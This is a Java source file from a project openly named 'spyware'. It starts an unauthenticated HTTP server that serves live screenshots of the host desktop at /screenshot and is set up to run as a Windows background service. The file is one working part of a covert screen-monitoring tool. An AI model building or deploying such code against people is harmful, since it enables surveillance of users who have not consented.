package com.github.moaxcp.spyware;

import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UncheckedIOException;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.concurrent.Executors;

/**
 * Simple web service using JDK's built-in HttpServer that exposes endpoints,
 * including /screenshot which returns a JPEG image captured by ScreenshotService.
 *
 * Also provides start/stop lifecycle methods compatible with Windows service wrappers.
 */
public class WebServer {
    private HttpServer server;

    private int port;

    /**
     * Starts the web server without blocking. Intended for Windows service wrappers.
     */
    public void start(int port) {
      this.port = port;
        try {
          server = HttpServer.create(new InetSocketAddress(port), 0);
          this.port = server.getAddress().getPort();
        } catch (IOException e) {
          if (port == 8080 || port == 0) {
            Random random = new Random();
            while (server == null) {
              this.port = random.nextInt(65535 - 1024) + 1024;
              try {
                server = HttpServer.create(new InetSocketAddress(this.port), 0);
              } catch (IOException ignored) {
              }
            }
          } else {
            throw new UncheckedIOException(e);
          }
        }

      // Register handlers
        server.createContext("/screenshot", new ScreenshotHandler(new ScreenshotService()));
        server.createContext("/", exchange -> {
            if (!"GET".equalsIgnoreCase(exchange.getRequestMethod())) {
                exchange.getResponseHeaders().add("Allow", "GET");
                exchange.sendResponseHeaders(405, -1);
                exchange.close();
                return;
            }
            try (InputStream is = WebServer.class.getResourceAsStream("/index.html")) {
                if (is == null) {
                    exchange.sendResponseHeaders(404, -1);
                    exchange.close();
                    return;
                }
                byte[] body = is.readAllBytes();
                exchange.getResponseHeaders().add("Content-Type", "text/html; charset=utf-8");
                exchange.sendResponseHeaders(200, body.length);
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(body);
                }
            }
        });

        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("[Spyware] Web server started on port " + this.port + ". Endpoints: /, /screenshot");
    }

    public int getPort() {
        return port;
    }

    public String getIP() {
        return server.getAddress().getAddress().getHostAddress();
    }

    /**
     * Stops the web server. Intended for Windows service wrappers.
     */
    public void stop() {
        if (server == null) {
            System.out.println("[Spyware] Server not running");
            return;
        }
        // 0-second delay: stop immediately, closing existing connections
        server.stop(0);
        server = null;
        System.out.println("[Spyware] Web server stopped");
    }

    public boolean isRunning() {
        return server != null;
    }
}
